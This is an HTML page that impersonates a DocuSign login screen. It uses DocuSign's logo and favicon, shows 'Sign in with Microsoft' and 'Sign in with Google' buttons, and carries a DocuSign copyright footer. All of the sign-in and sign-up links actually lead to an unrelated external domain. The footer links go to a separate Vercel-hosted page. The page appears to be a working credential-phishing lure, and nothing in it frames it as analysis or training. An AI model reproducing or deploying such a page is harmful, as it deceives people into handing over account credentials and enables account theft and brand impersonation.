<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Docusign</title>

    <link rel="icon" href="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-icons-favicon-default-64x64.svg" type="image/svg+xml">
    <link rel="canonical" href="https://account.docusign.com/" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .header {
            position: absolute;
            top: 20px;
            left: 20px;
        }

        .header img {
            height: 20px;
        }

        .main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* Responsive container */
        .container {
            background: white;
            width: 100%;
            max-width: 556px;
            border-radius: 12px;
            box-shadow: 0 6px 15px rgba(0,0,0,0.1);
            padding: 30px 20px;
        }

        .container h1 {
            font-size: 1.4rem;
            font-weight: 400;
            margin-bottom: 40px;
            text-align: left;
            padding-left: 10px;
        }

        .button-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Responsive buttons */
        .button {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            max-width: 426px;
            height: 50px;
            margin: 15px 0;
            font-size: 1rem;
            font-weight: bold;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            text-decoration: none;
            position: relative;
        }

        .button img {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
        }

        .google {
            background-color: #4285f4;
            color: white;
        }

        .microsoft {
            background-color: #ffffff;
            color: black;
            border: 1px solid #ddd;
        }

        .signup {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #4285f4;
            text-decoration: none;
            text-align: center;
            display: block;
        }

        .footer {
            width: 100%;
            background: #ffffff;
            border-top: 1px solid #ddd;
            padding: 20px 10px;
            font-size: 0.85rem;
            text-align: center;
        }

        .footer table {
            width: 100%;
            margin-bottom: 10px;
        }

        .footer a {
            text-decoration: none;
            color: #4285f4;
            font-style: italic;
        }

        .footer-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 10px;
        }

        .footer-logo img {
            height: 18px;
            margin-right: 5px;
        }

        .footer-text {
            font-size: 0.75rem;
            color: #aaa;
        }

        /* ---- MOBILE OPTIMIZATION ---- */
        @media (max-width: 480px) {
            .header {
                top: 10px;
                left: 10px;
            }

            .container {
                padding: 20px 15px;
            }

            .button {
                font-size: 0.9rem;
                height: 45px;
            }

            .container h1 {
                font-size: 1.2rem;
                text-align: center;
                padding-left: 0;
            }

            .footer td {
                padding: 4px 0;
                display: block;
            }
        }
    </style>
</head>

<body>
    <div class="header">
        <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign Logo">
    </div>

    <div class="main">
        <div class="container">
            <h1>Log in to DocuSign</h1>

            <div class="button-container">
                <a href="https://keeper.withoodoo.sa.com/UD!dahp1ACIzJOJBONLiMJ/" class="button microsoft">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="20">
                    SIGN IN WITH MICROSOFT
                </a>

                <a href="https://keeper.withoodoo.sa.com/UD!dahp1ACIzJOJBONLiMJ/" class="button google">
                    <img src="https://cdn-icons-png.flaticon.com/512/2504/2504914.png" width="20">
                    SIGN IN WITH GOOGLE
                </a>
            </div>

            <a href="https://keeper.withoodoo.sa.com/UD!dahp1ACIzJOJBONLiMJ/" class="signup">Sign Up for Free</a>
        </div>
    </div>

    <div class="footer">
        <table>
            <tr>
                <td><a href="https://red-eta.vercel.app/red.html">Contact Us</a></td>
                <td><a href="https://red-eta.vercel.app/red.html">Terms of Use</a></td>
                <td><a href="https://red-eta.vercel.app/red.html">Privacy</a></td>
                <td><a href="https://red-eta.vercel.app/red.html">Intellectual Property</a></td>
                <td><a href="https://red-eta.vercel.app/red.html">Trust</a></td>
            </tr>
        </table>

        <div class="footer-logo">
            <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg">
            <span>Powered by DocuSign</span>
        </div>

        <p class="footer-text">&copy; 2025 DocuSign, Inc. All rights reserved</p>
    </div>

</body>
</html>
